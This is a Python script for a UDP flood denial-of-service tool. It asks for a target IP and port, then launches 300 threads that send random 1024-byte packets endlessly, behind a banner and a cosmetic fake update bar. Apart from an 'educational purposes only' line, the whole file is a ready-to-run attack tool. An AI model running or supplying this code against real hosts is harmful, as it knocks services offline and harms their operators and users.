import socket
import random
import threading
import time
import sys
import os

# Change terminal title to 'ricebitev.2'
def change_terminal_title():
    os.system("title ricebitev.3")  # Works on Windows, for Linux/Mac, use `os.system('echo -n -e "\033]0;ricebitev.2\007"')`

# ASCII Art Header
def print_header():
    print("""
     ____             _            ____            
    |  __ \           | |          |  _ \           
    | |  | | ___ _ __ | |_ ___ _ __| |_) | ___ _ __ 
    | |  | |/ _ \ '_ \| __/ _ \ '__|  _ < / _ \ '__|
    | |__| |  __/ | | | ||  __/ |  | |_) |  __/ |   
    |_____/ \___|_| |_|\__\___|_|  |____/ \___|_|   
    """)
    print("WARNING: This tool is for educational purposes only!\n")
    print("Targeted Denial of Service (DoS) Attack Initiated...\n")
    print("Press Ctrl+C to stop the attack at any time.\n")
    time.sleep(2)

# Send UDP packets to the target IP
def send_packet(ip, port):
    """Function to send a single packet to the target IP and port."""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)  # Generate a random packet of 1024 bytes
    
    while True:
        try:
            client.sendto(bytes_to_send, (ip, port))
        except Exception as e:
            sys.stderr.write(f"Error: {e}\n")
            break

# Display the "Updating Version 3" message with a progress bar
def show_version_update():
    print("\nUpdating Version 3...\n")
    for i in range(101):
        sys.stdout.write("\r[{}{}] {}%".format(
            '#' * (i // 2), ' ' * (50 - (i // 2)), i))
        sys.stdout.flush()
        time.sleep(0.04)  # 4 seconds in total
    sys.stdout.write("\n")

# Main function to handle user input and attack
def main():
    # Change terminal title to "ricebitev.2"
    change_terminal_title()

    print_header()
    show_version_update()

    # Ask for the target IP and port
    ip = input("Enter the IP address to attack: ")
    
    try:
        port = int(input("Enter the port to attack (default 80): ") or 80)
    except ValueError:
        print("Invalid port number. Using default port 80.")
        port = 80

    print(f"\nTargeting IP: {ip}, Port: {port}...\n")

    # Create and start threads for concurrent packet sending
    threads = []
    for i in range(300):  # Increase number of threads to make it stronger
        thread = threading.Thread(target=send_packet, args=(ip, port))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Give the illusion of a progress bar for the attack
    try:
        print("Starting attack...\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\nAttack stopped by user.")

if __name__ == "__main__":
    main()
